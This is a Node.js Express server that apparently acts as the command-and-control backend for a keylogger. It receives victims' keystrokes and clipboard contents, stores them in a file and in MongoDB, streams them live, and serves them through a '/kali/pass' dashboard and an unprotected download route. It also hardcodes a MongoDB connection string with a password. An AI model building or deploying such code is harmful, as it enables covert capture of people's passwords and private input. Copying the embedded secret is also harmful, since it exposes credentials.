const express = require('express');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
const http = require('http');
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = require('socket.io')(server);

app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.json());
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));
app.use(express.static('public'));

// ✅ MongoDB connection
mongoose.connect('mongodb+srv://testnotforuse2000:KzndYKQf6VozPGy4@cluster0.t0qmy1f.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0', {
  useNewUrlParser: true,
  useUnifiedTopology: true
}).then(() => console.log("✅ Connected to MongoDB Atlas"))
  .catch(err => console.error("❌ MongoDB connection failed:", err.message));

// ✅ Schema
const keystrokeSchema = new mongoose.Schema({
  line: String, // store full log line
  timestamp: { type: Date, default: Date.now, index: { expires: '30d' } }
});

const Keystroke = mongoose.model('Keystroke', keystrokeSchema);

// ✅ Log file
const logFilePath = path.join(__dirname, 'keystrokes.log');
if (!fs.existsSync(logFilePath)) fs.writeFileSync(logFilePath, '');
const STROKE_EXPIRY_MINUTES = 5;

// ✅ POST /keystroke
app.post('/keystroke', async (req, res) => {
  const rawInput = req.body.key || '';
  const user = req.body.user || 'unknown';
  const now = new Date();
  const type = rawInput.includes('[Clipboard') ? 'clipboard' : 'keystroke';
  const cleaned = rawInput.replace(/[\x00-\x1F\x7F]/g, '').replace(/\s+/g, ' ').trim();
  const logLine = `[${now.toISOString()}] (${user}) [${type}]: ${cleaned}\n`;

  // ✅ Write to file
  fs.appendFile(logFilePath, logLine, (err) => {
    if (err) console.error('❌ File log failed:', err);
  });

  // ✅ Store in MongoDB
  try {
    await Keystroke.create({ line: logLine, timestamp: now });
  } catch (err) {
    console.error('❌ MongoDB error (ignored):', err.message);
  }

  io.emit('newKeystroke', { logLine }); // send raw logLine
  res.sendStatus(200);
});


// ✅ GET /
app.get('/kali/pass', async (req, res) => {
  try {
    const logs = await Keystroke.find({}).sort({ timestamp: -1 });
    res.render('dashboard', { logs });
  } catch (err) {
    res.status(500).send('❌ Failed to fetch logs.');
  }
});


app.get('/download-log', (req, res) => {
  res.download(logFilePath, 'keystrokes.log', (err) => {
    if (err) {
      console.error("❌ Log download failed:", err.message);
      res.status(500).send('❌ Error downloading log.');
    }
  });
});

server.listen(80, () => console.log("🚀 Server running at http://localhost"));
